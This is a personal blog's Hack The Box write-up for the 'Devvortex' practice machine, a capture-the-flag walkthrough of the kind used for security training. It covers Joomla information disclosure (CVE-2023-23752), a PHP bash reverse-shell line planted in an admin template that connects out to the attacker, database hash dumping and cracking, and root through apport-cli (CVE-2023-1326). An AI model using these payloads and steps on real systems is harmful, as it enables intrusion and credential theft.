@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta
+    name="description"
+    content=""
+  />
+  
+    
+      <title>Devvortex - HTB Writeup | Supaaasuge&#39;s Blog</title>
+    
+  
+  <link rel="stylesheet" href="/css/reset.css"/>
+  <link rel="stylesheet" href="/css/font.css"/>
+  <link rel="stylesheet" href="/css/smigle.css"/>
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+</head>
+
+  <body>
+    <div id="root">
+      <header>
+  <div id="brand">
+    <a class="icon-link" href="https://supaaasuge.github.io/">
+      <img
+        class="icon"
+        src="/images/brandIcon.svg"
+      />
+    </a>
+    <div class="text">
+      <a href="https://supaaasuge.github.io/"><h1>Supaaasuge&#39;s Blog</h1></a>
+      <h3>Aspiring IT/Cybersecurity Professional</h3>
+    </div>
+  </div>
+  <nav>
+    
+      
+        
+        <a href="/"><b>Home</b></a>
+      
+         | 
+        <a href="/about/"><b>About</b></a>
+      
+         | 
+        <a href="/posts/"><b>Posts</b></a>
+      
+         | 
+        <a href="/categories/"><b>Categories</b></a>
+      
+         | 
+        <a href="/tags/"><b>Tags</b></a>
+      
+         | 
+        <a href="/index.xml"><b>RSS</b></a>
+      
+    
+  </nav>
+  <hr />
+</header>
+
+      <div id="content">
+        
+  <main>
+    <article>
+      <h1 class="title">Devvortex - HTB Writeup</h1>
+      
+      <div class="post-meta">
+  <strong>
+    <span>Posted on</span>
+    <time>2024-05-06</time>
+    <span>in</span>
+    
+      <a href="/categories/hack-the-box">Hack The Box</a>
+  </strong>
+  <span> • 1113 words</span>
+  <span> • 6 minute read</span>
+  
+  
+    <div>
+      <span>Tags:</span>
+      
+        <a href="/tags/cve-2023-23752">CVE-2023-23752</a>, 
+        <a href="/tags/cve-2023-1326">CVE-2023-1326</a>, 
+        <a href="/tags/joomla">Joomla</a>, 
+        <a href="/tags/linux">Linux</a>
+    </div>
+  
+</div>
+
+      <div class="content"><p>In this post, I go over the path I took towards getting root on the Hack The Box machine: Devvortex(Easy). As usual we start out with an <code>nmap</code> port scan, where we discover a Joomla site hosted on port <code>80</code>. After finding the version of Joomla being used and looking for public exploits, I leverage CVE-2023-23752(Unauthenticated Information Disclosure) to get credentials to login as the user <code>lewis</code>. From here, we are able to edit templates on the site and add in a PHP reverse shell to get a foothold on the machine as <code>www-data</code>. Then, using the credentials found earlier we go through a MySQL database to get credentials for the user <code>logan</code> and begin lateral movement and enumeration for possible privilege escalation. Finally I then make use of CVE-2023-1326, a privilege escalation vulnerability in the <code>apport-cli</code> binary to get root.</p>
+<h1 id="enumeration">Enumeration</h1>
+<p>Starting off, I used <code>nmap</code> as usual.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -p- --min-rate <span style="color:#ae81ff">10000</span> -sCV -A 10.10.11.242
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-03-19 12:23 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> devvortex.htb <span style="color:#f92672">(</span>10.10.11.242<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.038s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: DevVortex
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>TCP/IP fingerprint:
+</span></span><span style="display:flex;"><span>OS:SCAN<span style="color:#f92672">(</span>V<span style="color:#f92672">=</span>7.94SVN%E<span style="color:#f92672">=</span>4%D<span style="color:#f92672">=</span>3/19%OT<span style="color:#f92672">=</span>22%CT<span style="color:#f92672">=</span>1%CU<span style="color:#f92672">=</span>30869%PV<span style="color:#f92672">=</span>Y%DS<span style="color:#f92672">=</span>2%DC<span style="color:#f92672">=</span>T%G<span style="color:#f92672">=</span>Y%TM<span style="color:#f92672">=</span>65F9
+</span></span><span style="display:flex;"><span>OS:BC1D%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>104%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>10A%TI<span style="color:#f92672">=</span>Z%CI<span style="color:#f92672">=</span>Z%II<span style="color:#f92672">=</span>I%TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>OS:SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>105%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>10A%TI<span style="color:#f92672">=</span>Z%CI<span style="color:#f92672">=</span>Z%II<span style="color:#f92672">=</span>I%TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>106%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>10A%TI
+</span></span><span style="display:flex;"><span>OS:<span style="color:#f92672">=</span>Z%CI<span style="color:#f92672">=</span>Z%II<span style="color:#f92672">=</span>I%TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>106%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>10B%TI<span style="color:#f92672">=</span>Z%CI<span style="color:#f92672">=</span>Z%II<span style="color:#f92672">=</span>I%TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>OPS<span style="color:#f92672">(</span>O1<span style="color:#f92672">=</span>M5
+</span></span><span style="display:flex;"><span>OS:3CST11NW7%O2<span style="color:#f92672">=</span>M53CST11NW7%O3<span style="color:#f92672">=</span>M53CNNT11NW7%O4<span style="color:#f92672">=</span>M53CST11NW7%O5<span style="color:#f92672">=</span>M53CST11NW7%O
+</span></span><span style="display:flex;"><span>OS:6<span style="color:#f92672">=</span>M53CST11<span style="color:#f92672">)</span>WIN<span style="color:#f92672">(</span>W1<span style="color:#f92672">=</span>FE88%W2<span style="color:#f92672">=</span>FE88%W3<span style="color:#f92672">=</span>FE88%W4<span style="color:#f92672">=</span>FE88%W5<span style="color:#f92672">=</span>FE88%W6<span style="color:#f92672">=</span>FE88<span style="color:#f92672">)</span>ECN<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%D
+</span></span><span style="display:flex;"><span>OS:F<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>FAF0%O<span style="color:#f92672">=</span>M53CNNSNW7%CC<span style="color:#f92672">=</span>Y%Q<span style="color:#f92672">=)</span>T1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%S<span style="color:#f92672">=</span>O%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AS%RD<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>OS:%Q<span style="color:#f92672">=)</span>T2<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T3<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T5<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>OS:Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T6<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%
+</span></span><span style="display:flex;"><span>OS:RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T7<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>U1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>40%I
+</span></span><span style="display:flex;"><span>OS:PL<span style="color:#f92672">=</span>164%UN<span style="color:#f92672">=</span>0%RIPL<span style="color:#f92672">=</span>G%RID<span style="color:#f92672">=</span>G%RIPCK<span style="color:#f92672">=</span>G%RUCK<span style="color:#f92672">=</span>G%RUD<span style="color:#f92672">=</span>G<span style="color:#f92672">)</span>IE<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DFI<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>40%CD<span style="color:#f92672">=</span>S<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#f92672">(</span>using port 23/tcp<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>HOP RTT      ADDRESS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   40.37 ms 10.10.14.1
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   32.92 ms devvortex.htb <span style="color:#f92672">(</span>10.10.11.242<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 35.94 seconds
+</span></span></code></pre></div><ul>
+<li>Domain found: <code>devvortex.htb</code></li>
+<li>Ports open: <code>22, 80</code></li>
+</ul>
+<p>Further enumeration using <code>gobuster</code> (<code>vhost</code>, <code>dir</code>, <code>dns</code>) doesn&rsquo;t lead to much, although we do find:</p>
+<ul>
+<li><code>dev.devvortex.htb</code></li>
+</ul>
+<p>After enumerating this endpoint with gobuster through directory brute forcing we find:
+<code>dev.devvortex.htb/administrator</code></p>
+<p>Switching over to the Wappalyzer extension it says the site is Joomla</p>
+<ul>
+<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla">Joomla Hacktrickz</a></li>
+</ul>
+<p>We find the Joomla version at <code>/administrator/manifests/files/joomla.xml</code>
+<img src="/posts/devvortex-htb.png" alt="alt"></p>
+<p>Joomla Version: <code>4.2.6</code></p>
+<p>After searching google &ldquo;<strong>Joomla 4.2.6 exploits</strong>&rdquo; we find <a href="https://www.exploit-db.com/exploits/51334">CVE-2023-23752</a>
+if you have <code>searchsploit</code> installed locally along with <code>exploit-db</code>, you should already have this locally.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Joomla! v4.2.8 - Unauthenticated information disclosure       | php/webapps/51334.rb
+</span></span><span style="display:flex;"><span>/usr/share/exploitdb/exploits/php/webapps/51334.rb
+</span></span></code></pre></div><p>After running this exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> ruby /usr/share/exploitdb/exploits/php/webapps/51334.rb http://dev.devvortex.htb
+</span></span><span style="display:flex;"><span>Users
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>649<span style="color:#f92672">]</span> lewis <span style="color:#f92672">(</span>lewis<span style="color:#f92672">)</span> - lewis@devvortex.htb - Super Users
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>650<span style="color:#f92672">]</span> logan paul <span style="color:#f92672">(</span>logan<span style="color:#f92672">)</span> - logan@devvortex.htb - Registered
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Site info
+</span></span><span style="display:flex;"><span>Site name: Development
+</span></span><span style="display:flex;"><span>Editor: tinymce
+</span></span><span style="display:flex;"><span>Captcha: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Access: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Debug status: false
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Database info
+</span></span><span style="display:flex;"><span>DB type: mysqli
+</span></span><span style="display:flex;"><span>DB host: localhost
+</span></span><span style="display:flex;"><span>DB user: lewis
+</span></span><span style="display:flex;"><span>DB password: P4ntherg0t1n5r3c0n##
+</span></span><span style="display:flex;"><span>DB name: joomla
+</span></span><span style="display:flex;"><span>DB prefix: sd4fg_
+</span></span><span style="display:flex;"><span>DB encryption <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>Nice now we have the username and password to login to the login page found at the endpoint <code>http://dev.devvortex.htb/administrator</code>
+Username: <code>lewis</code>
+Password: <code>P4ntherg0t1n5r3c0n##</code></p>
+<p>After logging into the admin panel, under <code>System</code>. we can find an option to customize Administrator templates in browser. From here we can very simply get a reverse shell by selecting any of the templates and adding in the line:
+<code>system('bash -c &quot;bash -i &gt;&amp; /dev/tcp/LOCAL_IP/4444 0&gt;&amp;1&quot;');</code></p>
+<p>After setting up a local listener, we can then get a shell as the <code>www-data</code> user.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.38<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.242<span style="color:#f92672">]</span> <span style="color:#ae81ff">60262</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>873<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>www-data@devvortex:~/dev.devvortex.htb/administrator$ python3 --version        
+</span></span><span style="display:flex;"><span>python3 --version
+</span></span><span style="display:flex;"><span>Python 3.8.10
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Updgrading shell to full tty</span>
+</span></span><span style="display:flex;"><span>www-data@devvortex:~/dev.devvortex.htb/administrator$ python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><p>From here, we can note the username and password we found earlier for the database.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mysql -h localhost -u lewis -pP4ntherg0t1n5r3c0n##
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Show databases</span>
+</span></span><span style="display:flex;"><span>SHOW DATABASES;
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span>| Database           |
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span>| information_schema |
+</span></span><span style="display:flex;"><span>| joomla             |
+</span></span><span style="display:flex;"><span>| performance_schema |
+</span></span><span style="display:flex;"><span>+--------------------+
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Use joomla db</span>
+</span></span><span style="display:flex;"><span>USE joomla;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Show all tables</span>
+</span></span><span style="display:flex;"><span>SHOW TABLES;
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># The output from this showed a lot of tables, however the most promising table containing potential sensitive information was:</span>
+</span></span><span style="display:flex;"><span>| sd4fg_users |
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Viewing the data from the sd4fg_users table</span>
+</span></span><span style="display:flex;"><span>SELECT * FROM sd4fg_users;
+</span></span><span style="display:flex;"><span>| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+</span></span><span style="display:flex;"><span>+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
+</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">649</span> | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     <span style="color:#ae81ff">0</span> |         <span style="color:#ae81ff">1</span> | 2023-09-25 16:44:24 | 2024-03-19 16:03:23 | <span style="color:#ae81ff">0</span>          |                                                                                                                                                         | NULL          |          <span style="color:#ae81ff">0</span> |        |      |            <span style="color:#ae81ff">0</span> |              |
+</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">650</span> | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     <span style="color:#ae81ff">0</span> |         <span style="color:#ae81ff">0</span> | 2023-09-26 19:15:42 | NULL                |            | <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;admin_style&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;admin_language&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;language&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;editor&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;timezone&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;a11y_mono&#34;</span>:<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#e6db74">&#34;a11y_contrast&#34;</span>:<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#e6db74">&#34;a11y_highlight&#34;</span>:<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#e6db74">&#34;a11y_font&#34;</span>:<span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">}</span> | NULL  
+</span></span></code></pre></div><p>Nice! we got some password hashes now. We can then copy and past these hashes to a file on our host machine and start to try and crack the hashes using <code>hashcat</code>.</p>
+<p>Firstly, we need to find the correct mode to use for hashcat using <code>hashid</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashid <span style="color:#e6db74">&#39;$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12&#39;</span> -m
+</span></span><span style="display:flex;"><span>Analyzing <span style="color:#e6db74">&#39;$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Blowfish<span style="color:#f92672">(</span>OpenBSD<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Hashcat Mode: 3200<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Woltlab Burning Board 4.x 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> bcrypt <span style="color:#f92672">[</span>Hashcat Mode: 3200<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Nice so it is a <code>bcrypt</code> hash&hellip; Moving on to hashcat:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">3200</span> -a <span style="color:#ae81ff">0</span> hashes.txt /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><ul>
+<li>It takes a bit but eventually we get a hit on the password:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
+</span></span></code></pre></div><p>Now SSH&rsquo;ing into the host:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh logan@devvortex.htb  
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;devvortex.htb (10.10.11.242)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This host key is known by the following other names/addresses:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ~/.ssh/known_hosts:15: [hashed name]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>devvortex.htb<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">logan@devvortex.htb&#39;</span>s password:
+</span></span></code></pre></div><p>Now, after grabbing the flag <code>user.txt</code> we can move on to escalating privileges to the root user.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> logan:
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> logan on devvortex:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>User logan may run the following commands on devvortex:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> /usr/bin/apport-cli
+</span></span></code></pre></div><p>From this information, we then google: <code>&quot;apport-cli sudo privilege escalation&quot;</code>.
+We then find a PoC for <a href="https://github.com/diego-tella/CVE-2023-1326-PoC">CVE-2023-1326</a>.</p>
+<p>This privilege escalation attack was found in apport-cli 2.26.0 and earlier.
+We can check if this version of <code>apport-cli</code> is vulnerable using the command:
+<code>sudo /usr/bin/apport-cli -v</code></p>
+<pre tabindex="0"><code>2.20.11
+</code></pre><p>Interesting, although it isn&rsquo;t an exact match on the version it is still worth a shot. However currently there isn&rsquo;t a crash file present at <code>/var/crash/</code> to use based off of the PoC in the link.</p>
+<p>After checking what a valid crash report file looks like (format wise) from <a href="https://wiki.ubuntu.com/Apport?action=AttachFile&amp;do=get&amp;target=data-format.pdf">here</a></p>
+<p>We can make a <code>example.crash</code> file as follows:</p>
+<pre tabindex="0"><code>ProblemType: Crash
+Architecture: amd64
+</code></pre><p>Now testing the exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /usr/bin/apport-cli -c ./example.crash
+</span></span><span style="display:flex;"><span>..
+</span></span><span style="display:flex;"><span>..
+</span></span><span style="display:flex;"><span>..
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Please choose <span style="color:#f92672">(</span>S/V/K/I/C<span style="color:#f92672">)</span>: V
+</span></span><span style="display:flex;"><span>!/bin/bash
+</span></span></code></pre></div><p>Nice, now we have root!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cd ~/root
+</span></span><span style="display:flex;"><span>cat root.txt
+</span></span></code></pre></div></div>
+    </article>
+  </main>
+
+      </div>
+      <footer>
+  <hr />
+  
+    <p id="social">
+      Find me around the web:
+      <br />
+      
+        
+        <a href="https://github.com/supaaasuge">GitHub</a>
+      
+         | 
+        <a href="https://x.com/supaaasuge">Twitter</a>
+      
+    </p>
+  
+  <p class="copyright">
+    Copyright © 2024
+    <a href="https://supaaasuge.github.io/"><strong>Supaaasuge</strong></a>.
+    This work is licensed under the
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA 4.0</a> license.
+  </p>
+  <p class="builtWith">
+    Built with
+    <a href="http://www.gohugo.io/">Hugo</a>,
+    using the theme
+    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>,
+    which was influenced by the theme
+    <a href="https://github.com/sumnerevans/smol">smol</a>.
+  </p>
+</footer>
+
+    </div>
+  </body>
+</html>
